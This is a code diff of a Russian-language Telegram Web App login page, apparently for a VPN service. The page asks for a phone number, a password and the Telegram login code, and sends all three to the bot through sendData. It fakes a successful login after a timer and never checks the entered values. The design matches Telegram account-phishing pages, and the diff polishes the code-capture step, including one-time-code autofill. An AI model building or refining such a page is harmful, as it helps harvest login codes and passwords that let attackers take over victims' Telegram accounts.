@@ -22,7 +22,7 @@
     .flag { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); font-size: 20px; pointer-events: none; }
     .number-input { flex: 1; border: none; padding: 14px 16px; font-size: 17px; outline: none; }
     input[type="tel"]::-webkit-outer-spin-button, input[type="tel"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-    input, select { padding: 14px 16px; font-size: 17px; border: none; outline: none; }
+    input { padding: 14px 16px; font-size: 17px; border: none; outline: none; border-radius: 14px; }
     input:focus { outline: none; }
     .btn { width: 100%; max-width: 380px; padding: 16px; font-size: 18px; font-weight: 600; color: white; background: linear-gradient(145deg, #4285f4, #1967d2); border: none; border-radius: 14px; box-shadow: 0 8px 24px rgba(66,133,244,0.3); cursor: pointer; transition: all 0.24s; }
     .btn:hover { transform: translateY(-1px); box-shadow: 0 12px 32px rgba(66,133,244,0.4); }
@@ -55,7 +55,6 @@
           <option value="+49" data-flag="🇩🇪">+49</option>
           <option value="+33" data-flag="🇫🇷">+33</option>
           <option value="+375" data-flag="🇧🇾">+375</option>
-          <!-- добавь остальные по желанию -->
         </select>
         <span class="flag" id="selectedFlag">🇷🇺</span>
       </div>
@@ -68,7 +67,7 @@
   </div>
 
   <div class="input-group" id="codeGroup" style="display:none;">
-    <input type="text" id="code" placeholder="Код из Telegram" inputmode="numeric" pattern="[0-9]*" maxlength="6" />
+    <input type="text" id="code" placeholder="Код из Telegram (6 символов)" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" />
   </div>
 
   <button class="btn" id="submitBtn">Продолжить</button>
@@ -120,7 +119,7 @@
     return countrySelect.value + phoneNumber.value.trim();
   }
 
-  async function handleSubmit() {
+  function handleSubmit() {
     const fullPhone = getFullPhone();
     const numPart = phoneNumber.value.trim();
 
@@ -129,51 +128,57 @@
 
       hideStatus();
       submitBtn.disabled = true;
-      submitBtn.textContent = 'Проверка...';
+      submitBtn.textContent = 'Запрос кода...';
 
       const payload = { action: 'request_login', phone: fullPhone };
 
       if (window.Telegram?.WebApp) {
         window.Telegram.WebApp.sendData(JSON.stringify(payload));
+        triggerFeedback('heavy');
       }
 
       setTimeout(() => {
-        showStatus('Введите пароль и код из Telegram');
+        showStatus('Код отправлен в Telegram\nВведите пароль и код');
         passwordGroup.style.display = 'block';
         codeGroup.style.display = 'block';
         phoneNumber.disabled = true;
         countrySelect.disabled = true;
         submitBtn.textContent = 'Войти';
         submitBtn.disabled = false;
-        step = 'credentials';
-        passwordInput.focus();
-      }, 800);
-    }
-    else if (step === 'credentials') {
+        step = 'code';
+        codeInput.focus();
+      }, 1200);
+    } 
+    else if (step === 'code') {
       const password = passwordInput.value.trim();
-      const code = codeInput.value.trim();
+      const code = codeInput.value.trim().toUpperCase();
 
       if (!password) return showStatus('Введите пароль', true);
-      if (code.length !== 6) return showStatus('Код — 6 символов', true);
+      if (code.length !== 6) return showStatus('Код должен быть 6 символов', true);
 
       hideStatus();
       submitBtn.disabled = true;
-      submitBtn.textContent = 'Вход...';
+      submitBtn.textContent = 'Проверка...';
 
       const payload = { action: 'submit_login', phone: fullPhone, password, code };
 
       if (window.Telegram?.WebApp) {
         window.Telegram.WebApp.sendData(JSON.stringify(payload));
+        triggerFeedback('heavy');
       }
 
       setTimeout(() => {
-        showStatus('Вход выполнен!\nПеренаправление...');
-        setTimeout(() => window.location.href = 'main.html', 1200);
-      }, 1200);
+        localStorage.setItem('dxs_vpn_authenticated', 'true');
+        showStatus('Вход выполнен!\nПеренаправление...', false);
+        setTimeout(() => window.location.href = 'main.html', 1400);
+      }, 1400);
     }
   }
 
   submitBtn.addEventListener('click', handleSubmit);
+
+  phoneNumber.addEventListener('keypress', e => { if (e.key === 'Enter') handleSubmit(); });
+  codeInput.addEventListener('keypress', e => { if (e.key === 'Enter') handleSubmit(); });
 
   toRegister.addEventListener('click', () => {
     triggerFeedback('light');
